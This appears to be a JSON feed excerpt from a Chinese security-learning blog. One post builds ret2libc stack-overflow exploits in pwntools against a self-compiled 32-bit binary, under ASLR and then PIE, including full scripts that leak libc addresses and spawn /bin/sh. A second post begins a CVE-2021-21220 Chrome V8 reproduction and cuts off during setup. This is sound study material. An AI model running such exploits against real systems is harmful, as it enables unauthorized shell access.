class=\"string\">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>调试一下,这种如何调试呢??????</p>\n<p>0xf7e57db0</p>\n<p>0xf7f78b2b</p>\n<p>不知道为什么,重新编译了一遍就好了….太奇怪了</p>\n<h3 id=\"如何动态获取这俩地址呢\"><a href=\"#如何动态获取这俩地址呢\" class=\"headerlink\" title=\"如何动态获取这俩地址呢?\"></a>如何动态获取这俩地址呢?</h3><p>system_addr &#x3D; libc.sym[‘system’] 这样是不行的,这个获取的是在libc里面的偏移,需要获取libc的加载地址</p>\n<p>需要基地址,基地址怎么获取呢? 如果没开启ALSR和PIE的话,可以通过调试获取,pwntools里不能直接获取吗?</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  vmmap</span><br><span class=\"line\">[ Legend:  Code | Heap | Stack ]</span><br><span class=\"line\">Start      End        Offset     Perm Path</span><br><span class=\"line\"><span class=\"number\">0x8047000</span> <span class=\"number\">0x8048000</span> <span class=\"number\">0x000000</span> rw- /home/ubuntu/pwn/a.out</span><br><span class=\"line\"><span class=\"number\">0x8048000</span> <span class=\"number\">0x8049000</span> <span class=\"number\">0x001000</span> r-x /home/ubuntu/pwn/a.out</span><br><span class=\"line\"><span class=\"number\">0x8049000</span> <span class=\"number\">0x804a000</span> <span class=\"number\">0x001000</span> rw- /home/ubuntu/pwn/a.out</span><br><span class=\"line\"><span class=\"number\">0xf7e1c000</span> <span class=\"number\">0xf7e1d000</span> <span class=\"number\">0x000000</span> rw-</span><br><span class=\"line\"><span class=\"number\">0xf7e1d000</span> <span class=\"number\">0xf7fcd000</span> <span class=\"number\">0x000000</span> r-x /home/ubuntu/glibc-<span class=\"built_in\">all</span>-<span class=\"keyword\">in</span>-one/libs/<span class=\"number\">2.23</span>-0ubuntu11<span class=\"number\">.3</span>_i386/libc-<span class=\"number\">2.23</span>.so</span><br></pre></td></tr></table></figure>\n\n<p>0xf7e1d000  + 0x3adb0 &#x3D;  0xf7e57db0 这样就对上了</p>\n<p>system_addr &#x3D; 0xf7e1d000 + libc.sym[‘system’] 就可以得到system的地址了</p>\n<p>但是 binsh_addr &#x3D; 0xf7e1d000 + libc.search(b’&#x2F;bin&#x2F;sh’) 这个不会,会报错 </p>\n<p>oooooo需要加一个next</p>\n<p>binsh_addr &#x3D; 0xf7e1d000 + next(libc.search(b’&#x2F;bin&#x2F;sh’))</p>\n<h3 id=\"最后exp\"><a href=\"#最后exp\" class=\"headerlink\" title=\"最后exp\"></a>最后exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&#x27;./a.out&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">ret = <span class=\"number\">0xdeadbeef</span></span><br><span class=\"line\">system_addr = <span class=\"number\">0xf7e1d000</span> + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">binsh_addr = <span class=\"number\">0xf7e1d000</span> + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh&#x27;</span>))</span><br><span class=\"line\"><span class=\"comment\">#system_addr = 0xf7e57db0</span></span><br><span class=\"line\"><span class=\"comment\">#binsh_addr = 0xf7f78b2b</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;A&quot;</span> * <span class=\"number\">140</span> + p32(system_addr) + p32(ret) + p32(binsh_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"在此基础之上-开启ALSR\"><a href=\"#在此基础之上-开启ALSR\" class=\"headerlink\" title=\"在此基础之上,开启ALSR\"></a>在此基础之上,开启ALSR</h1><p>echo 2 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</p>\n<p>gcc -m32 -fno-stack-protector -z noexecstack -no-pie dep.c -o nopie.out</p>\n<p>echo 2 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</p>\n<p>cp ..&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu11.3_i386&#x2F;libc.so.6 .&#x2F;</p>\n<p>ASLR改变的是堆、栈、共享库(libc等)的位置,程序本身的地址是不变的,也就是vuln_func,main等这些地址.</p>\n<h2 id=\"构造exp-1\"><a href=\"#构造exp-1\" class=\"headerlink\" title=\"构造exp\"></a>构造exp</h2><p>那为啥exp中的write也是不变的呢??????因为这个write是plt中的write,不是libc中的,所以和延迟绑定有关?</p>\n<p>0x8048320是write的地址,它是plt表的地址,所以,什么是plt表呢?</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.plt:08048320 _write          proc near               ; CODE XREF: main+2D↓p</span><br><span class=\"line\">.plt:08048320                 jmp     ds:off_804A014</span><br><span class=\"line\">.plt:08048320 _write          endp</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关于plt表\"><a href=\"#关于plt表\" class=\"headerlink\" title=\"关于plt表\"></a>关于plt表</h3><p><a href=\"https://blog.csdn.net/qq_38350702/article/details/123387642\">https://blog.csdn.net/qq_38350702&#x2F;article&#x2F;details&#x2F;123387642</a></p>\n<p>所以说应该是plt表地址我们是知道的,但是got不知道,通过plt泄露got,进而得到system的got</p>\n<p>因为system不在plt里,无法直接用system的plt</p>\n<p>思路就是先用write泄露write在内存中的位置,然后利用write在libc中和system的偏移,进行计算system和&#x2F;bin&#x2F;sh</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&#x27;./nopie.out&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./nopie.out&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">vuln_func = <span class=\"number\">0x0804843b</span> //vuln_func</span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = <span class=\"string\">b&quot;A&quot;</span> * <span class=\"number\">140</span> + p32(elf.sym[<span class=\"string\">&#x27;write&#x27;</span>]) + p32(vuln_func) + p32(<span class=\"number\">1</span>) + p32(elf.got[<span class=\"string\">&#x27;write&#x27;</span>]) + p32(<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload1)</span><br><span class=\"line\"></span><br><span class=\"line\">write_addr = u32(io.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">system_addr = write_addr - libc.sym[<span class=\"string\">&#x27;write&#x27;</span>] + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">binsh_addr = write_addr - libc.sym[<span class=\"string\">&#x27;write&#x27;</span>] + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = <span class=\"string\">b&quot;B&quot;</span> * <span class=\"number\">140</span> + p32(system_addr) + p32(vuln_func) + p32(binsh_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload2)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>书里给的有问题,总感觉少了什么条件,exp跑不通</p>\n<p>[<em>] Switching to int eractive mode<br>[</em>] Got EOF while reading in interactive</p>\n<p>为什么第一个exp不行,这个链接里的就可以??,进行分析</p>\n<p><a href=\"https://blog.csdn.net/weixin_44644249/article/details/113620457\">https://blog.csdn.net/weixin_44644249&#x2F;article&#x2F;details&#x2F;113620457</a></p>\n<p>首先先把payload进行输出</p>\n<p>payload1和2</p>\n<p>b’AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \\x83\\x04\\x08;\\x84\\x04\\x08\\x01\\x00\\x00\\x00\\x14\\xa0\\x04\\x08\\x04\\x00\\x00\\x00’<br>b’BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\\xb0\\xdd\\xd8\\xf7;\\x84\\x04\\x08+\\xeb\\xea\\xf7’</p>\n<p>然后再看成功的</p>\n<p>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaajunk \\x04V\\x04\\x00\\x00 \\x04\\x04\\x00<br>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaajunk°à÷junk+»ò÷</p>\n<p>所以应该是编码问题?? 或者是作者用的python2?? 是python2和3的问题??</p>\n<p>只能说自己太蠢了,(也想吐槽作者写的不好,不该写死的东西干嘛要写死,自己又没给二进制文件)</p>\n<p>当然更重要的是,不能照抄别人的,要对exp的每一行的含义都了如指掌才可以!!!</p>\n<p>作者在exp中给的 vuln_func的地址是写死的,但事实上自己编译的话肯定会有不同,所以需要根据实际情况修改, 或者直接动态获取,不要写死!!!</p>\n<p>0x080484a5 &lt;+26&gt;:\te8 ac ff ff ff\tcall 0x8048456 <vuln_func></vuln_func></p>\n<p>exp修改的部分为vuln_func &#x3D; elf.sym[“vuln_func”] </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&#x27;./nopie.out&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./nopie.out&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">vuln_func = elf.sym[<span class=\"string\">&quot;vuln_func&quot;</span>] </span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = <span class=\"string\">b&quot;A&quot;</span> * <span class=\"number\">140</span> + p32(elf.sym[<span class=\"string\">&#x27;write&#x27;</span>]) + p32(vuln_func) + p32(<span class=\"number\">1</span>) + p32(elf.got[<span class=\"string\">&#x27;write&#x27;</span>]) + p32(<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload1)</span><br><span class=\"line\"></span><br><span class=\"line\">write_addr = u32(io.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">system_addr = write_addr - libc.sym[<span class=\"string\">&#x27;write&#x27;</span>] + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">binsh_addr = write_addr - libc.sym[<span class=\"string\">&#x27;write&#x27;</span>] + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = <span class=\"string\">b&quot;B&quot;</span> * <span class=\"number\">140</span> + p32(system_addr) + p32(vuln_func) + p32(binsh_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload2)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"在此基础之上-开启PIE\"><a href=\"#在此基础之上-开启PIE\" class=\"headerlink\" title=\"在此基础之上,开启PIE\"></a>在此基础之上,开启PIE</h1><p>开启了pie后,程序的加载地址就不是固定的0x8048000了,所以直接用elf.sym[“vuln_func”] 是不行的,需要知道是从哪里开始加载的了</p>\n<p>gcc -m32 -fno-stack-protector -z noexecstack -pie -fno-pie dep.c -o pie.out</p>\n<p>patchelf –set-interpreter &#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu11.3_i386&#x2F;ld-linux.so.2 .&#x2F;pie.out<br>patchelf –set-rpath &#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu11.3_i386&#x2F; .&#x2F;pie.out</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">加载的时候,每次地址就不一样了</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0x565555a3</span> &lt;main+<span class=\"number\">17</span>&gt;        call   <span class=\"number\">0x5655556d</span> &lt;vuln_func&gt;</span><br><span class=\"line\"><span class=\"number\">0x5655556d</span> &lt;vuln_func&gt;:\t<span class=\"number\">0x81e58955</span></span><br></pre></td></tr></table></figure>\n\n<p>结果..加载的地址每次还是一样的,经过排查是gdb的问题</p>\n<h2 id=\"为什么gdb调试的时候-它的main的地址是不变的-运行的时候就是变的了\"><a href=\"#为什么gdb调试的时候-它的main的地址是不变的-运行的时候就是变的了\" class=\"headerlink\" title=\"为什么gdb调试的时候,它的main的地址是不变的??? 运行的时候就是变的了????\"></a>为什么gdb调试的时候,它的main的地址是不变的??? 运行的时候就是变的了????</h2><p><a href=\"https://blog.csdn.net/weixin_43350880/article/details/98869099\">https://blog.csdn.net/weixin_43350880&#x2F;article&#x2F;details&#x2F;98869099</a></p>\n<p>因为gdb是默认关闭aslr的,通过在gdb中输入命令aslr on开启,然后每次加载的地址就不一样了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x56630000</span> <span class=\"number\">0x56631000</span> <span class=\"number\">0x000000</span> r-x /home/ubuntu/pwn/pie.out</span><br><span class=\"line\"><span class=\"number\">0x56631000</span> <span class=\"number\">0x56632000</span> <span class=\"number\">0x000000</span> r-- /home/ubuntu/pwn/pie.out</span><br><span class=\"line\"><span class=\"number\">0x56632000</span> <span class=\"number\">0x56633000</span> <span class=\"number\">0x001000</span> rw- /home/ubuntu/pwn/pie.out</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0x56613000</span> <span class=\"number\">0x56614000</span> <span class=\"number\">0x000000</span> r-x /home/ubuntu/pwn/pie.out</span><br><span class=\"line\"><span class=\"number\">0x56614000</span> <span class=\"number\">0x56615000</span> <span class=\"number\">0x000000</span> r-- /home/ubuntu/pwn/pie.out</span><br><span class=\"line\"><span class=\"number\">0x56615000</span> <span class=\"number\">0x56616000</span> <span class=\"number\">0x001000</span> rw- /home/ubuntu/pwn/pie.out</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0x565f3000</span> <span class=\"number\">0x565f4000</span> <span class=\"number\">0x000000</span> r-x /home/ubuntu/pwn/pie.out</span><br><span class=\"line\"><span class=\"number\">0x565f4000</span> <span class=\"number\">0x565f5000</span> <span class=\"number\">0x000000</span> r-- /home/ubuntu/pwn/pie.out</span><br><span class=\"line\"><span class=\"number\">0x565f5000</span> <span class=\"number\">0x565f6000</span> <span class=\"number\">0x001000</span> rw- /home/ubuntu/pwn/pie.out</span><br></pre></td></tr></table></figure>\n\n<p>这样的话,elf.sym[“vuln_func”]  就不能用了,因为有一块随机加载的偏移,需要想办法泄露</p>\n<p>假设我们已经泄露了</p>\n<p> (在dep.c中加入 printf(“main addr: %p”,&amp;main); 但是捏,这个有问题,问题就是哪怕你把它加在了前面,它也是后输出的,这是为什么呢,我们假设的应该是先得到这个地址,然后给vuln_func发送payload</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">int</span> main(<span class=\"built_in\">int</span> argc, char *argv[]) &#123;</span><br><span class=\"line\">        printf(<span class=\"string\">&quot;main addr: %p&quot;</span>,&amp;main);</span><br><span class=\"line\">        vuln_func();</span><br><span class=\"line\">        write(STDOUT_FILENO, <span class=\"string\">&quot;Hello world!\\n&quot;</span>, <span class=\"number\">13</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Hello world!</span><br><span class=\"line\">main addr: <span class=\"number\">0x5658c5d2</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"write\"><a href=\"#write\" class=\"headerlink\" title=\"write\"></a>write</h3><p>这个应该是和缓冲区什么的有关</p>\n<p><a href=\"https://oomake.com/question/2542933\">https://oomake.com/question/2542933</a></p>\n<p>printf带缓冲区,所以要等缓冲区满或者遇到换行符才会输出,write不带缓冲区,直接就输出了</p>\n<p>加一个换行符就可以了</p>\n<p>printf(“main addr: %p\\n”,&amp;main);</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><p>这里假设了会泄漏main的地址,我们加一行代码就直接打印出来了,</p>\n<p>printf(“%p\\n”,&amp;main);</p>\n<p>然后接收main的地址,其他的思路就差不多了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&#x27;./pie.out&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pie.out&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">main_addr = <span class=\"built_in\">int</span>(io.recvline(), <span class=\"number\">16</span>)</span><br><span class=\"line\">base_addr = main_addr - elf.sym[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\">vuln_func = base_addr + elf.sym[<span class=\"string\">&#x27;vuln_func&#x27;</span>]</span><br><span class=\"line\">plt_write = base_addr + elf.sym[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">got_write = base_addr + elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">ebx = base_addr + <span class=\"number\">0x2000</span>\t\t\t<span class=\"comment\"># GOT address</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = <span class=\"string\">&quot;A&quot;</span>*<span class=\"number\">132</span> + p32(ebx) + <span class=\"string\">&quot;AAAA&quot;</span> + p32(plt_write) + p32(vuln_func) + p32(<span class=\"number\">1</span>) + p32(got_write) + p32(<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload1)</span><br><span class=\"line\"></span><br><span class=\"line\">write_addr = u32(io.recv())</span><br><span class=\"line\">system_addr = write_addr - libc.sym[<span class=\"string\">&#x27;write&#x27;</span>] + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">binsh_addr = write_addr - libc.sym[<span class=\"string\">&#x27;write&#x27;</span>] + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = <span class=\"string\">&quot;B&quot;</span> * <span class=\"number\">140</span> + p32(system_addr) + p32(vuln_func) + p32(binsh_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload2)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>如果printf有其他字母呢,怎么接收?</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/",
            "url": "https://tangzichengcc.github.io/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/",
            "title": "CVE-2021-21220 Chrome v8远程代码执行漏洞复现与分析",
            "date_published": "2022-11-17T14:20:59.000Z",
            "content_html": "<h1 id=\"tips\"><a href=\"#tips\" class=\"headerlink\" title=\"tips:\"></a>tips:</h1><p>标记为橙色的为不严谨,有待研究</p>\n<p><img src=\"/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Untitled.png\" alt=\"Untitled\"></p>\n<h1 id=\"V8-漏洞利用之环境搭建\"><a href=\"#V8-漏洞利用之环境搭建\" class=\"headerlink\" title=\"V8 漏洞利用之环境搭建\"></a><strong><strong>V8 漏洞利用之环境搭建</strong></strong></h1><h2 id=\"一、编译环境搭建\"><a href=\"#一、编译环境搭建\" class=\"headerlink\" title=\"一、编译环境搭建\"></a>一、编译环境搭建</h2><p>以下都出自这篇文章:<a href=\"https://zhuanlan.zhihu.com/p/493674086\">https://zhuanlan.zhihu.com/p/493674086</a></p>\n<p>更新软件列表、更新软件、安装依赖</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get upgrade</span><br><span class=\"line\"></span><br><span class=\"line\">sudo apt install bison cdbs curl flex g++ git python vim pkg-config</span><br></pre></td></tr></table></figure>\n\n<p>安装depot_tools</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir /root/tools &amp;&amp; cd /root/tools</span><br><span class=\"line\">git clone https:<span class=\"comment\">//chromium.googlesource.com/chromium/tools/depot_tools.git /root/tools/depot_tools</span></span><br><span class=\"line\">echo <span class=\"string\">&#x27;export PATH=$PATH:&quot;/root/tools/depot_tools&quot;&#x27;</span> &gt;&gt; /etc/profile</span><br><span class=\"line\">echo <span class=\"string\">&#x27;export PATH=$PATH:&quot;/root/tools/depot_tools&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br><span class=\"line\">source /etc/profile</span><br><span class=\"line\">source ~/.bashrc</span><br></pre></td></tr></table></figure>\n\n<p>安装ninja：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https:<span class=\"comment\">//github.com/ninja-build/ninja.git</span></span><br><span class=\"line\">cd ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; cd ..</span><br><span class=\"line\">echo <span class=\"string\">&#x27;export PATH=$PATH:&quot;$(pwd)/ninja&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>\n\n<p>下载v8</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir /root/v8 &amp;&amp; cd /root/v8</span><br><span class=\"line\">fetch v8  #这个可能会花很长时间，取决于个人的网络环境，如果中断了则 gclient sync同步</span><br><span class=\"line\">cd v8</span><br><span class=\"line\">sudo ./build/install-build-deps.sh --no-chromeos-fonts\t# 在linux系统中这个命令是需要的</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二、找漏洞版本commit\"><a href=\"#二、找漏洞版本commit\" class=\"headerlink\" title=\"二、找漏洞版本commit\"></a>二、找漏洞版本commit</h2><p>编译的话,需要找到漏洞版本的github的commit</p>\n<p>受影响的Chrome最高版本为：<code>89.0.4389.114</code>受影响的V8最高版本为：<code>8.9.255.24</code></p>\n<h3 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h3><p><a href=\"https://omahaproxy.appspot.com/\">https://omahaproxy.appspot.com</a></p>\n<p>通过这个网站可以找漏洞版本的commit</p>\n<p><img src=\"/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Untitled_1.png\" alt=\"Untitled_1\"></p>\n<h3 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h3><p>从漏洞的issue链接<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=821137\">https://bugs.chromium.org/p/chromium/issues/detail?id=821137</a><br>找到修复的commit链接<a href=\"https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d\">https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d</a> ,可以看到漏洞信息、存在漏洞的上一个版本（parent）、diff修复信息和漏洞poc</p>\n<h3 id=\"方法三\"><a href=\"#方法三\" class=\"headerlink\" title=\"方法三\"></a>方法三</h3><p>直接从github找commit</p>\n<p><a href=\"https://github.com/v8/v8/tags?after=8.9.255\">https://github.com/v8/v8/tags?after=8.9.255</a></p>\n<h2 id=\"三、编译\"><a href=\"#三、编译\" class=\"headerlink\" title=\"三、编译\"></a>三、编译</h2><p>分了两个版本,一个是release,一个是debug</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span 